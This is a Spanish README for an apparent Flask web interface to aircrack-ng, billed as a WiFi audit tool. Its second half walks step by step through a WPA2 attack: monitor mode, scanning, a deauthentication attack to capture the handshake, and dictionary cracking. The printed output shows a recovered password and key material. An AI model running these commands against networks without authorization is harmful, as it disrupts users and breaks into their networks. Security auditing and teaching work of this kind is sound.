# WiFi Audit Tool

Esta es una herramienta de auditoría WiFi basada en Flask que interactúa con herramientas como `aircrack-ng` para realizar auditorías de redes WiFi, pero con una pagina web.

## Estructura del Proyecto
wifi_audit/
│
├── src/
│   ├── app.py
│   ├── routes.py
│   ├── services.py
│   ├── utils.py
│   ├── templates/
│   │   ├── index.html
│   │   ├── audit_panel.html
│   │   └── monitor_mode.html
│   ├── static/
│   │   ├── js/
│   │   │   └── scripts.js
│   │   ├── css/
│   │   │   └── styles.css
│   │   └── images/
│   │       └── logo.png
│   └── logs/
│       └── audit_logs.log
├── README.md
├── requirements.txt
├── .gitignore
└── venv/  # Entorno virtual (si necesario, fuera de src)


## Instalación

1. Clona el repositorio:
    ```bash
    git clone 
    cd wifi_audit
    ```

2. Crea y activa un entorno virtual:
    ```bash
    python3 -m venv venv
    source venv/bin/activate  # Si vas a usar Windows usa `venv\Scripts\activate`
    ```

3. Instala las dependencias, solo basta con ejecutar este comando:
    ```bash
    pip install -r requirements.txt
    ```

## Uso

1. Ejecuta la aplicación:
    ```bash
    flask run
    ```

2. Con esto se abrira tu navegador y te dirigira al link `http://127.0.0.1:5000`.

## Estructura del Código

- `app.py`: Archivo principal para inicializar Flask.
- `routes.py`: Registro y gestión de rutas Flask.
- `services.py`: Funciones y lógica del backend.
- `utils.py`: Funciones reutilizables y utilidades.
- `templates/`: Carpeta para las plantillas HTML.
- `static/`: Carpeta para archivos estáticos.
- `logs/`: Carpeta para los logs.


## Licencia

Este proyecto está licenciado bajo la Licencia MIT.


Para poder realizar esta auditoria a traves de consola, necesitamos instalar previamente algunos recursos.

El primero sera aircrack

    sudo apt install aircrack-ng

Ahora en la terminal buscamos las interfaces de red que esten disponilbles de la siguiente forma:
    
    ifconfig

Nos apareceran todas las interfaces, pero solo necesitamos la de nuestra antena wifi que aparecera de esta forma:

    wlan0 

Necesitamos que nuestra interfaz este en modo monitor, para eso ejecutamos lo siguiente     

    sudo airmon-ng start wlan0
    
Y ahora nos aparecera algo asi:

    wlan0mon

El siguiente comando nos permitirá escanear todas las redes wifi disponibles
  
    sudo airodump-ng wlan0mon 
    
Alli se encontrara la red que queremos auditar 

    F2:F3:98:74:2C:1A  -75        7        0    0  11  180   WPA2 CCMP   PSK  Redmi note10 pro                                         
    

Este comando realiza un escaneo a los dispositivos conectados a la red y muesstra la estation lo cual  es importante para la auditoria 

    sudo airodump-ng -c 11 --bssid F2:F3:98:74:2C:1A -w auditoria wlan0mon

Con airplay se puede desahibilitar la conexion de los dispositivos conectados, el cual permite capturar el intercambio de handshake.

    sudo aireplay-ng -0 9 -a F2:F3:98:74:2C:1A -c 14:D4:24:8E:B5:4F wlan0mon

Este seria elresultado
    CH 11 ][ Elapsed: 3 mins ][ 2024-11-28 16:05 ][ WPA handshake: F2:F3:98:74:2C:1A 

Una vez capturado el handshake se ingresa al comando junto con el diccionario y el archivo .cap, para realizar el crackeo de la contraseña wifi.
    
    sudo aircrack-ng -b F2:F3:98:74:2C:1A -w diccionario.txt auditoria-02.cap 

resultado del terminal:

Aircrack-ng 1.7 

      [00:00:00] 4/12 keys tested (133.64 k/s) 

      Time left: 0 seconds                                      58.33%

                          KEY FOUND! [ universe18 ]


      Master Key     : F5 4B 1A 56 DC B7 4B CC BC BC F9 D7 7B 40 A1 ED 
                       D8 4A 38 3F 57 7F A5 76 68 D1 E7 D4 BC 34 D3 95 

      Transient Key  : 3F 4A E3 57 2D 65 4A B9 02 0D F8 2F 79 05 59 36 
                       6B 2C 0D 38 F9 3A 4A 11 69 65 DE AC 59 65 28 2C 
                       F7 E0 E9 42 44 5E 69 2A 11 48 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : E4 D0 69 8B 8E 27 96 16 33 23 15 2C 0E AC 7A 82 


sudo airmon-ng stop wlan0mon  -> se desactiva el modo monitor 
